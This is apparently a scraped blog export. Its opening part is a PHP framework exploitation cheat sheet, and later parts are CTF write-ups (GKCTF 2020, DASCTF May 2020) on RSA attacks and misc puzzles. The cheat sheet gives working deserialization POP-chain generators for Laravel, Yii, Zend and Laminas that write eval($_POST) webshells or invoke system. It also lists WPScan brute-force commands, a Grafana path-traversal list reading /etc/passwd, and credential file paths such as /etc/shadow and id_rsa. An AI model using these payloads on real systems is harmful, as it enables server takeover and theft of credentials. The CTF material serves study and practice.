base64_encode(serialize($a));&#125; b. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace Faker&#123; class Generator&#123; protected $providers = []; protected $formatters = []; function __construct() &#123; $this-&gt;formatter = &quot;register&quot;; $this-&gt;formatters = 9999; &#125; &#125;&#125;namespace Illuminate\\Routing&#123; class PendingResourceRegistration&#123; protected $registrar; protected $name; protected $controller; protected $options = []; protected $registered = false; function __construct() &#123; $this-&gt;registrar = new \\Faker\\Generator(); $this-&gt;name = &quot;d:/var/www/untitiled/public/1.php&quot;; $this-&gt;controller = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;options = 8; &#125; &#125;&#125;namespace Symfony\\Component\\Mime\\Part&#123; abstract class AbstractPart &#123; private $headers = null; &#125; class SMimePart extends AbstractPart&#123; protected $_headers; public $inhann; function __construct()&#123; $this-&gt;_headers = [&quot;register&quot;=&gt;&quot;file_put_contents&quot;]; $this-&gt;inhann = new \\Illuminate\\Routing\\PendingResourceRegistration(); &#125; &#125;&#125;namespace&#123; $a = new \\Symfony\\Component\\Mime\\Part\\SMimePart(); $ser = preg_replace(&quot;/([^\\&#123;]*\\&#123;)(.*)(s:49.*)(\\&#125;)/&quot;,&quot;\\\\1\\\\3\\\\2\\\\4&quot;,serialize($a)); echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));&#125; c. 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpnamespace GuzzleHttp\\Cookie&#123; class SetCookie &#123; private static $defaults = [ &#x27;Name&#x27; =&gt; null, &#x27;Value&#x27; =&gt; null, &#x27;Domain&#x27; =&gt; null, &#x27;Path&#x27; =&gt; &#x27;/&#x27;, &#x27;Max-Age&#x27; =&gt; null, &#x27;Expires&#x27; =&gt; null, &#x27;Secure&#x27; =&gt; false, &#x27;Discard&#x27; =&gt; false, &#x27;HttpOnly&#x27; =&gt; false ]; function __construct() &#123; $this-&gt;data[&#x27;Expires&#x27;] = &#x27;&lt;?php phpinfo();?&gt;&#x27;; $this-&gt;data[&#x27;Discard&#x27;] = 0; &#125; &#125; class CookieJar&#123; private $cookies = []; private $strictMode; function __construct() &#123; $this-&gt;cookies[] = new SetCookie(); &#125; &#125; class FileCookieJar extends CookieJar&#123; private $filename; private $storeSessionCookies; function __construct() &#123; parent::__construct(); $this-&gt;filename = &quot;d:/var/www/untitled/public/shell.php&quot;; $this-&gt;storeSessionCookies = true; &#125; &#125;&#125;namespace&#123; $a = new \\GuzzleHttp\\Cookie\\FileCookieJar(); echo base64_encode(serialize($a));&#125; d. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Faker&#123; class Generator&#123; protected $providers = []; protected $formatters = []; function __construct() &#123; $this-&gt;formatter = &quot;dispatch&quot;; $this-&gt;formatters = 9999; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; public function __construct() &#123; $this-&gt;event = &quot;calc.exe&quot;; $this-&gt;events = new \\Faker\\Generator(); &#125; &#125;&#125;namespace Symfony\\Component\\Mime\\Part&#123; abstract class AbstractPart &#123; private $headers = null; &#125; class SMimePart extends AbstractPart&#123; protected $_headers; public $inhann; function __construct()&#123; $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;]; $this-&gt;inhann = new \\Illuminate\\Broadcasting\\PendingBroadcast(); &#125; &#125;&#125;namespace&#123; $a = new \\Symfony\\Component\\Mime\\Part\\SMimePart(); $ser = preg_replace(&quot;/([^\\&#123;]*\\&#123;)(.*)(s:49.*)(\\&#125;)/&quot;,&quot;\\\\1\\\\3\\\\2\\\\4&quot;,serialize($a)); echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));&#125; ​ Yii 版本 a. 在controllers目录新建TestController.php控制器，打开TestController.php文件输入&lt;?php echo Yii::getVersion(); ?&gt;，访问Yii项目中的test控制器下的index：index.php?r=test b. /vendor/yiisoft/yii2/BaseYii.php 2.0.x &lt;2.0.37 反序列化 a. yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() b. yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\CreateAction::run() c. 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace yii\\rest&#123; class IndexAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[0]);?&gt;&quot;);exit();&#x27;; &#125; &#125;&#125;namespace yii\\db&#123; use yii\\web\\DbSession; class BatchQueryResult &#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader=new DbSession(); &#125; &#125;&#125;namespace yii\\web&#123; use yii\\rest\\IndexAction; class DbSession &#123; public $writeCallback; public function __construct()&#123; $a=new IndexAction(); $this-&gt;writeCallback=[$a,&#x27;run&#x27;]; &#125; &#125;&#125;namespace&#123; use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult()));&#125; 2.0.38 反序列化 a. Codeception\\Extension\\RunProcess::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() b. Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run() 2.0.42 反序列化 yii 2.0.42 最新反序列化利用全集 a. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpnamespace Codeception\\Extension&#123; use Prophecy\\Prophecy\\ObjectProphecy; class RunProcess&#123; private $processes = []; public function __construct()&#123; $a = new ObjectProphecy(&#x27;1&#x27;); $this-&gt;processes[]=new ObjectProphecy($a); &#125; &#125; echo urlencode(serialize(new RunProcess()));&#125;namespace Prophecy\\Prophecy&#123; use Prophecy\\Doubler\\LazyDouble; class ObjectProphecy&#123; private $lazyDouble; private $revealer; public function __construct($a)&#123; $this-&gt;revealer=$a;//一个调用自己的对象 $this-&gt;lazyDouble=new lazyDouble(); &#125; &#125; &#125;namespace Prophecy\\Doubler&#123; use Prophecy\\Doubler\\Doubler; class LazyDouble&#123; private $doubler; private $class; private $interfaces; private $arguments; private $double=null; public function __construct()&#123; $this-&gt;doubler = new Doubler(); $this-&gt;arguments=array(&#x27;x&#x27;=&gt;&#x27;x&#x27;); $this-&gt;class=new \\ReflectionClass(&#x27;Exception&#x27;); $this-&gt;interfaces[]=new \\ReflectionClass(&#x27;Exception&#x27;); &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default)&#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Prophecy\\Doubler\\Generator\\Node&#123; class ClassNode&#123;&#125;&#125;namespace Prophecy\\Doubler&#123; use Faker\\DefaultGenerator; use Prophecy\\Doubler\\Generator\\ClassCreator; use Prophecy\\Doubler\\Generator\\Node\\ClassNode; class Doubler&#123; private $namer; private $mirror; private $patches; private $creator; public function __construct()&#123; $name=&#x27;x&#x27;; $node=new ClassNode(); $this-&gt;namer=new DefaultGenerator($name); $this-&gt;mirror=new DefaultGenerator($node); $this-&gt;patches=array(new DefaultGenerator(false)); $this-&gt;creator=new ClassCreator(); &#125; &#125;&#125;namespace Prophecy\\Doubler\\Generator&#123; use Faker\\DefaultGenerator; class ClassCreator&#123; private $generator; public function __construct()&#123; $this-&gt;generator=new DefaultGenerator(&#x27;eval($_POST[&quot;cmd&quot;]);&#x27;); &#125; &#125;&#125; b. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Codeception\\Extension&#123; use Faker\\UniqueGenerator; class RunProcess&#123; private $processes = []; public function __construct()&#123; $this-&gt;processes[]=new UniqueGenerator(); &#125; &#125; echo urlencode(serialize(new RunProcess()));&#125;namespace Faker&#123; use Symfony\\Component\\String\\LazyString; class UniqueGenerator&#123; protected $generator; protected $maxRetries; public function __construct()&#123; $a = new LazyString(); $this-&gt;generator = new DefaultGenerator($a); $this-&gt;maxRetries = 2; &#125; &#125; class DefaultGenerator&#123; protected $default; public function __construct($default = null)&#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Symfony\\Component\\String&#123; class LazyString&#123; private $value; public function __construct()&#123; include(&quot;closure/autoload.php&quot;); $a = function()&#123;phpinfo();&#125;; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;value=$b; &#125; &#125;&#125; ​ Joomla! 3.x &lt;3.4.6 反序列化（+1.5.x/2.x） joomla_exp ​ Wordpress 扫描器 WPScan 扫描站点：wpscan --url http://xxxx 扫描主题：wpscan --url http://xxxx --enumerate t 扫描主题存在漏洞：wpscan --url http://xxxx --enumerate vt 扫描安装插件：wpscan --url http://xxxx --enumerate p 扫描安装插件漏洞：wpscan --url http://xxxx --enumerate vp 枚举用户：wpscan --url http://xxxx --enumerate u 暴力破解： wpscan --url http://xxxx --wordlist 密码字典 --username 用户名或者密码字典 wpscan --url xxxx -P /root/Desktop/top10000.txt -U admin 插件 sp-client-document-manager CVE-2021-24347 Getshell 直接上传，后缀名大小写绕过，上传后路径为wp-content/uploads/sp-client-document-manager/[user_id]/[file_name]，admin的userid为1 moodle https://github.com/HoangKien1020/Moodle_RCE User Meta CVE-2022-0779 simple-link-directory CVE-2022-0760 https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210 ​ ZendZend FrameWork Pop Chain zend framework 1 反序列化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpclass Zend_Mail&#123;&#125;class Zend_Log&#123; protected $_writers; function __construct() &#123; $this-&gt;_writers = [new Zend_Log_Writer_Mail()]; &#125;&#125;class Zend_Log_Writer_Mail&#123; protected $_eventsToMail; protected $_mail; protected $_layoutEventsToMail; protected $_layout; function __construct() &#123; $this-&gt;_mail = new Zend_Mail(); $this-&gt;_eventsToMail = [1]; $this-&gt;_layoutEventsToMail = &quot;&quot;; $this-&gt;_layout = new Zend_Config_Writer_Yaml(); &#125;&#125;class Zend_CodeGenerator_Php_File&#123; protected $_filename; protected $_body; function __construct() &#123; $this-&gt;_filename = &quot;a.php&quot;; $this-&gt;_body = &#x27;@eval(base64_decode($_POST[1]));&#x27;; &#125;&#125;class Zend_Config&#123; protected $_data; protected $_loadedSection; protected $_extends; function __construct() &#123; $this-&gt;_loadedSection = &quot;Mrkaixin&quot;; $this-&gt;_data = []; $this-&gt;_extends = &quot;Mrkaixin&quot;; &#125;&#125;class Zend_Config_Writer_Yaml&#123; protected $events; protected $_config; protected $_yamlEncoder; function __construct() &#123; $this-&gt;events = &quot;Mrkaixin&quot;; $this-&gt;_config = new Zend_Config(); $this-&gt;_yamlEncoder = [new Zend_CodeGenerator_Php_File(), &#x27;write&#x27;]; &#125;&#125;echo base64_encode(serialize(new Zend_Log())); ​ LaminasZend FrameWork Pop Chain 入口 action: http://your-ip/public/index.php/application[/:action] zend framework 4 反序列化+RCE a. 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace Zend\\View\\Renderer;use Zend\\Config\\Config;class PhpRenderer&#123; function __construct() &#123; $this-&gt;__helpers = new Config(); &#125;&#125;namespace Zend\\Config;class Config &#123; protected $data = []; function __construct() &#123; $this-&gt;data = [&#x27;shutdown&#x27;=&gt;&quot;phpinfo&quot;]; &#125;&#125;namespace Zend\\Log;use Zend\\View\\Renderer\\PhpRenderer;class Logger&#123; protected $writers; function __construct() &#123; $this-&gt;writers = [new PhpRenderer()]; &#125;&#125;echo base64_encode(serialize(new Logger())); b. 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace Laminas\\View\\Resolver&#123; class TemplateMapResolver&#123; protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;]; &#125;&#125;namespace Laminas\\View\\Renderer&#123; class PhpRenderer&#123; private $__helpers; function __construct()&#123; $this-&gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); &#125; &#125;&#125;namespace Laminas\\Log\\Writer&#123; abstract class AbstractWriter&#123;&#125; class Mail extends AbstractWriter&#123; protected $eventsToMail = [&quot;ls&quot;]; protected $subjectPrependText = null; protected $mail; function __construct()&#123; $this-&gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); &#125; &#125;&#125;namespace Laminas\\Log&#123; class Logger&#123; protected $writers; function __construct()&#123; $this-&gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; &#125; &#125;&#125;namespace&#123;$a = new \\Laminas\\Log\\Logger();echo base64_encode(serialize($a));&#125; ​ Grafana 重要文件 12345678910111213141516171819/usr/sbin/grafana-server/etc/init.d/grafana-server/etc/default/grafana-server/etc/grafana/grafana.ini/var/log/grafana/grafana.log/var/lib/grafana/grafana.db/usr/share/grafana/conf/defaults.ini/etc/passwd/etc/shadow/home/grafana/.bash_history/home/grafana/.ssh/id_rsa/root/.bash_history/root/.ssh/id_rsa/usr/local/etc/grafana/grafana.ini/proc/net/fib_trie/proc/net/tcp/proc/self/cmdline 2.6.0 任意文件读取 CVE-2021-43798 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/public/plugins/alertGroups/../../../../../../../../etc/passwd/public/plugins/alertlist/../../../../../../../../etc/passwd/public/plugins/alertmanager/../../../../../../../../etc/passwd/public/plugins/annolist/../../../../../../../../etc/passwd/public/plugins/barchart/../../../../../../../../etc/passwd/public/plugins/bargauge/../../../../../../../../etc/passwd/public/plugins/canvas/../../../../../../../../etc/passwd/public/plugins/cloudwatch/../../../../../../../../etc/passwd/public/plugins/dashboard/../../../../../../../../etc/passwd/public/plugins/dashlist/../../../../../../../../etc/passwd/public/plugins/debug/../../../../../../../../etc/passwd/public/plugins/elasticsearch/../../../../../../../../etc/passwd/public/plugins/gauge/../../../../../../../../etc/passwd/public/plugins/geomap/../../../../../../../../etc/passwd/public/plugins/gettingstarted/../../../../../../../../etc/passwd/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd/public/plugins/grafana/../../../../../../../../etc/passwd/public/plugins/graph/../../../../../../../../etc/passwd/public/plugins/graphite/../../../../../../../../etc/passwd/public/plugins/heatmap/../../../../../../../../etc/passwd/public/plugins/histogram/../../../../../../../../etc/passwd/public/plugins/influxdb/../../../../../../../../etc/passwd/public/plugins/jaeger/../../../../../../../../etc/passwd/public/plugins/live/../../../../../../../../etc/passwd/public/plugins/logs/../../../../../../../../etc/passwd/public/plugins/loki/../../../../../../../../etc/passwd/public/plugins/mixed/../../../../../../../../etc/passwd/public/plugins/mssql/../../../../../../../../etc/passwd/public/plugins/mysql/../../../../../../../../etc/passwd/public/plugins/news/../../../../../../../../etc/passwd/public/plugins/nodeGraph/../../../../../../../../etc/passwd/public/plugins/opentsdb/../../../../../../../../etc/passwd/public/plugins/piechart/../../../../../../../../etc/passwd/public/plugins/pluginlist/../../../../../../../../etc/passwd/public/plugins/postgres/../../../../../../../../etc/passwd/public/plugins/prometheus/../../../../../../../../etc/passwd/public/plugins/stat/../../../../../../../../etc/passwd/public/plugins/state-timeline/../../../../../../../../etc/passwd/public/plugins/status-history/../../../../../../../../etc/passwd/public/plugins/table-old/../../../../../../../../etc/passwd/public/plugins/table/../../../../../../../../etc/passwd/public/plugins/tempo/../../../../../../../../etc/passwd/public/plugins/testdata/../../../../../../../../etc/passwd/public/plugins/text/../../../../../../../../etc/passwd/public/plugins/timeseries/../../../../../../../../etc/passwd/public/plugins/welcome/../../../../../../../../etc/passwd/public/plugins/xychart/../../../../../../../../etc/passwd/public/plugins/zipkin/../../../../../../../../etc/passwd","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"CMS","slug":"CMS","permalink":"https://lazzzaro.github.io/tags/CMS/"}],"author":"Lazzaro"},{"title":"GKCTF 2020","slug":"match-GKCTF-2020","date":"2020-05-24T10:03:26.000Z","updated":"2020-06-26T10:47:04.329Z","comments":true,"path":"2020/05/24/match-GKCTF-2020/","link":"","permalink":"https://lazzzaro.github.io/2020/05/24/match-GKCTF-2020/","excerpt":"","text":"CRYPTO小学生的密码学 e(x)=11x+6(mod26) 密文：welcylk （flag为base64形式） 仿射密码，解密公式：$m=11^{-1}(e(x)-6)\\pmod {26}$ 12345678910111213import gmpy2import base64def affline_decode(cipher_text, a, b, m): plain_text = &#x27;&#x27; for i in cipher_text: if i in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;: plain_text += chr(((ord(i)-ord(&#x27;a&#x27;))-b)*gmpy2.invert(a,m) % m + ord(&#x27;a&#x27;)) else: plain_text += i print(plain_text) m = affline_decode(&#x27;welcylk&#x27;, 11, 6, 26)flag = base64.b64encode(m) ​ babycrypto 附件：encode.txt 已知：n，e，enc，p高位（1024-128） RSA中的coppersmith攻击（已知p的高位攻击） Sage脚本求p，q： 12345678910111213141516171819#Sagefrom sage.all import *n = 0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005Lp4 = 0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b#p去0的剩余位e = 65537pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)#经过以上一些函数处理后，n和p已经被转化为10进制if roots: p = p4+int(roots[0]) print(&quot;n: &quot;+str(n)) print(&quot;p: &quot;+str(p)) print(&quot;q: &quot;+str(n//p)) 再结合enc正常解出明文m即可。 Backdoor p=k*M+(65537**a %M) 已知：RSA正常加密脚本，公钥文件pub.pem，base64加密密文文件flag.enc 公钥文件解析得n，e，密文文件base64解码处理得c 从 $p=kM+(65537^a \\% M)$ 入手，查询了解到此式子为弱素数生成公式 弱素数生成公式参考： https://asecuritysite.com/encryption/copper https://medium.com/asecuritysite-when-bob-met-alice/so-what-was-the-problem-with-the-estonian-id-system-and-tpms-1ef02a9bde7f 强/弱素数定义：https://zh.wikipedia.org/wiki/%E5%BC%BA%E7%B4%A0%E6%95%B0 n的素数因子p是由此公式生成的，生成脚本在参考文章中已知： 1234567891011121314151617181920212223242526from Crypto.Util import numberk=3vals=39a=12M=1primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997, 1009, 1013, 1019, 1021, 1031, 1033, 1039, 1049, 1051, 1061, 1063, 1069, 1087, 1091, 1093, 1097, 1103, 1109, 1117, 1123, 1129, 1151, 1153, 1163, 1171, 1181, 1187, 1193, 1201, 1213, 1217, 1223, 1229, 1231, 1237, 1249, 1259, 1277, 1279, 1283, 1289, 1291, 1297, 1301, 1303, 1307, 1319, 1321, 1327, 1361, 1367, 1373, 1381, 1399, 1409, 1423, 1427, 1429, 1433, 1439, 1447, 1451, 1453, 1459, 1471, 1481, 1483, 1487, 1489, 1493, 1499, 1511, 1523, 1531, 1543, 1549, 1553, 1559, 1567, 1571, 1579, 1583, 1597, 1601, 1607, 1609, 1613, 1619, 1621, 1627, 1637, 1657, 1663, 1667, 1669, 1693, 1697, 1699, 1709, 1721, 1723, 1733, 1741, 1747, 1753, 1759, 1777, 1783, 1787, 1789, 1801, 1811, 1823, 1831, 1847, 1861, 1867, 1871, 1873, 1877, 1879, 1889, 1901, 1907, 1913, 1931, 1933, 1949, 1951, 1973, 1979, 1987, 1993, 1997, 1999, 2003, 2011, 2017, 2027, 2029, 2039, 2053, 2063, 2069, 2081, 2083, 2087, 2089, 2099, 2111, 2113, 2129, 2131, 2137, 2141, 2143, 2153, 2161, 2179, 2203, 2207, 2213, 2221, 2237, 2239, 2243, 2251, 2267, 2269, 2273, 2281, 2287, 2293, 2297, 2309, 2311, 2333, 2339, 2341, 2347, 2351, 2357, 2371, 2377, 2381, 2383, 2389, 2393, 2399, 2411, 2417, 2423, 2437, 2441, 2447, 2459, 2467, 2473, 2477, 2503, 2521, 2531, 2539, 2543, 2549, 2551, 2557, 2579, 2591, 2593, 2609, 2617, 2621, 2633, 2647, 2657, 2659, 2663, 2671, 2677, 2683, 2687, 2689, 2693, 2699, 2707, 2711, 2713, 2719, 2729, 2731, 2741, 2749, 2753, 2767, 2777, 2789, 2791, 2797, 2801, 2803, 2819, 2833, 2837, 2843, 2851, 2857, 2861, 2879, 2887, 2897, 2903, 2909, 2917, 2927, 2939, 2953, 2957, 2963, 2969, 2971, 2999]for x in range(0, vals): M=M*primes[x]p=k*M+(65537**a %M)print(&#x27;k=&#x27;,k)print(&#x27;a=&#x27;,a)print(&#x27;Number of prime numbers used=&#x27;,vals)print(&#x27;======&#x27;)print(&#x27;M=&#x27;,M)print(&#x27;\\nPrime=&#x27;,p)isp = number.isPrime(p)if (isp==1): print(&#x27;Value is prime&#x27;)else: print(&#x27;Value is not prime&#x27;) $M$ 代表前 $x$ 项素数的乘积， $x$ 的可选值有5，16，39，71，80，126。在参数 $k$ 与 $a$ 取值不大的情况下，选取不同的 $x$ 值，得到的 $p$ 的位数不同。 根据已知的n为134位，预估p的位数不超过134/2=67位，可确定 $x$ 值取39，即 $M=962947420735983927056946215901134429196419130606213075415963491270$ 参考得到的 $p$ 符合位数要求。 要得到正确的p值，尝试爆破 $k$ 与 $a$ ： 1234567891011121314151617import gmpy2M=962947420735983927056946215901134429196419130606213075415963491270n=15518961041625074876182404585394098781487141059285455927024321276783831122168745076359780343078011216480587575072479784829258678691739for k in range(100): for a in range(100): p=k*M+(65537**a %M) if n%p==0: print(&#x27;k=&#x27;,k) print(&#x27;a=&#x27;,a) print(&#x27;\\nPrime=&#x27;,p) isp = gmpy2.is_prime(p) if isp: print(&#x27;Value is prime&#x27;) else: print(&#x27;Value is not prime&#x27;) print(&#x27;======&#x27;) 结果： 易知两个结果分别为正确的p，q值~ 再结合密文c正常解出明文m即可。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"DASCTF May × BJDCTF 3rd 安恒五月赛","slug":"match-DASCTF-May-×-BJDCTF-3rd-安恒五月赛","date":"2020-05-23T17:13:24.000Z","updated":"2020-06-07T17:45:03.702Z","comments":true,"path":"2020/05/24/match-DASCTF-May-×-BJDCTF-3rd-安恒五月赛/","link":"","permalink":"https://lazzzaro.github.io/2020/05/24/match-DASCTF-May-%C3%97-BJDCTF-3rd-%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9B/","excerpt":"","text":"MISCQuestionaire 叮~ 您有一份调查问卷~ 请查收~ https://forms.gle/Vmzt99LazrtXsRLM9 谷歌问卷调查，FQ打开，北京知识，每回答对一个空得flag片段。 直接F12看源码大法，有答案，有结果，拼接得flag。 /bin/cat 2 [CAUTION] cats as numerous as stars are coming… 解出的答案经md5后提交~ 远看可现一张二维码，没用脚本，直接stegesolve.jar，取Red plane得明显的黑白图片，上扫码工具得flag。 testyournc Test your nc hint1: /f1a9.bak 你看到了嘛? hint2: 用df命令看看硬盘总共多大，再看看flag多大。 nc交互题。 ls发现目录下有flag和readme，cat flag发现打开卡死，ls -al查看发现flag文件很大（15T+）。 在根目录找到可读文件f1a9.bak，是生成flag文件的源码： 发现是每个字符都随机偏移 $1024\\times1024\\times1024\\times k\\quad (\\rm offset\\mit \\leq k\\leq \\rm offset+2048 )$ 后写入，$\\rm offset$ 本身也在不断递增，中间填满空字符，无法按固定位置读取。 试过很多shell命令的结合，cat,tr,sed,grep,hexdump都各种花样卡死… 受大佬提示此类文件是稀疏文件，非空数据块存入磁盘，空数据库不占用磁盘空间。 尝试将文件移到本地处理，使用tar命令将flag文件打包到某个可写位置，比如/var/tmp，注意到tar有个参数可高效处理稀疏文件： -S或—sparse 倘若一个文件内含大量的连续0字节，则将此文件存成稀疏文件。 上命令：tar -zcvfS /var/tmp/flag.tar.gz flag 这时查看flag.tar.gz文件大小就很小了（0.3KB+） 在nc环境运行 cat flag.tar.gz | base64 再在本地运行 echo -n &quot;H4sIAAAAAAAAA+3RTUrDQBgG4AgK/oBnqDfImCbpUty78gRptQURAlpXIvQIXkDEK3gBPZJHMK2iRasbGWfzPBBm5pu/N8n4vJlkkeWdqp8v2s68DXX5Pg7zJ2ShqKpQ1aHO6yzf75YXWe84drC5q8tpc9HrZRdtO/1t3Wg6jhMg//TeD4t++KE+W+xae5h97F2urz8dfKmvvU3sHnXt1rfb3yY37rKVp20+rr5l+/B5ZX3ncvU5i8s/37T738uhlr8A/+vl/naWOgMAAAAQ1/i8mVynDgEAAABEVVb9qqiLInUOAAAAIJ5BHU5TZwAAAADi6udFkzoDAAAAENegnzoBAAAAENvJMHUCAAAAILaiLJrRKB8My3L/JnUYAAAAIIpJ2570ztrhXuogAAAAAAAAwJ+9AsKEhXoAoAAA&quot; | base64 -d 把得到的base64字符串存储到本地。 本地解压出原始flag文件（15T+）： tar -zxvfS flag.tar.gz 再使用 tar -cvfS flag-new flag 得到稀疏处理过的flag稀疏文件。 PS：写到最后发现，不用在本地处理，直接 tar -cvfS /var/tmp/flag.tar.gz flag 应该也成。 CRYPTObbcrypto its so simple 给定脚本： 12345678910111213141516171819202122232425# -*- coding:utf-8 -*-import A,SALTfrom itertools import *def encrypt(m, a, si): c=&quot;&quot; for i in range(len(m)): c+=hex(((ord(m[i])) * a + ord(next(si))) % 128)[2:].zfill(2) return c if __name__ == &quot;__main__&quot;: m = &#x27;flag&#123;********************************&#125;&#x27; a = A salt = SALT assert(len(salt)==3) assert(salt.isalpha()) si = cycle(salt.lower()) print(&quot;明文内容为：&quot;) print(m) print(&quot;加密后的密文为：&quot;) c=encrypt(m, a, si) print(c)#加密后的密文为：#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d salt长度为3，又知明文m的前5位和后1位字符，有对应关系： (&#39;f&#39;*a+salt[0])%128 = 0x17 (&#39;l&#39;*a+salt[1])%128 = 0x74 (&#39;a&#39;*a+salt[2])%128 = 0x01 (&#39;g&#39;*a+salt[0])%128 = 0x50 (&#39;&#123;&#39;*a+salt[1])%128 = 0x4b (&#39;&#125;&#39;*a+salt[1])%128 = 0x3d 可用脚本爆破： 12345678910111213141516import stringlower = string.printable[10:36]for a in range(1001): for s0 in lower: if hex((102*a+ord(s0)) % 128) == &#x27;0x17&#x27; and hex((103*a+ord(s0)) % 128) == &#x27;0x50&#x27;: print(a, s0)for a in range(1001): for s1 in lower: if hex((108*a+ord(s1)) % 128) == &#x27;0x74&#x27; and hex((123*a+ord(s1)) % 128) == &#x27;0x4b&#x27; and hex((125*a+ord(s1)) % 128) == &#x27;0x3d&#x27;: print(a, s1)for a in range(1001): for s2 in lower: if hex((97*a+ord(s2)) % 128) == &#x27;0x1&#x27;: print(a, s2) 容易得到符合条件的最小a=57及对应salt=&#39;ahh&#39; 在用脚本逆向求出flag{}中间字符： 1234567891011121314151617a = 57si0 = 97si1 = 104si2 = 104c = [0x17, 0x74, 0x01, 0x50, 0x4b, 0x01, 0x25, 0x27, 0x2c, 0x12, 0x27, 0x43, 0x17, 0x1e, 0x2c, 0x25, 0x0a, 0x60, 0x2e, 0x3a, 0x7c, 0x20, 0x6e, 0x01, 0x4a, 0x01, 0x27, 0x03, 0x27, 0x3a, 0x3c, 0x01, 0x60, 0x17, 0x3a, 0x73, 0x75, 0x3d]flag=&#x27;&#x27;for i in range(len(c)): if i%3 ==0: for m in range(0,127): if (m*57+si0)%128 == c[i]: flag+=chr(m) else: for m in range(0,127): if (m*57+si1)%128 == c[i]: flag+=chr(m)print(flag) 得到flag~ easyLCG easy LCG 线性同余生成器（LCG） 线性同余生成器是个产生伪随机数的方法，它是根据递归公式： $N_{j+1}=(A\\times N_j+B)\\pmod M$ 